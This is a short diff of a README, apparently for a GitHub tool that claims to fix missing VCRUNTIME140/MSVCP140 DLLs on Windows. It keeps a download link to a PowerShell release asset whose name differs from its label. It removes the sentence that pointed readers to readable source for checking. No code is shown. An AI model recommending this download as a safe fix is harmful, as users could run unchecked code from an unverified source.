@@ -57,7 +57,9 @@ Prompt you to restart your PC once the fix is complete.
 
 📥 [Download Fix‐MissingDLLs.ps1](https://github.com/VCRUNTIME140dll/vcruntime140-dll-and-msvcp140-dll-missing-in-windows-10-11/releases/download/v1.0.1/Fix-VCRUNTIME140.ps1)
 
-> This executable is compiled from a readable PowerShell script. See [Fix‑MissingDLLs.ps1](./Fix‑MissingDLLs.ps1) to verify the source code.
+
+
+
 
 ---
 
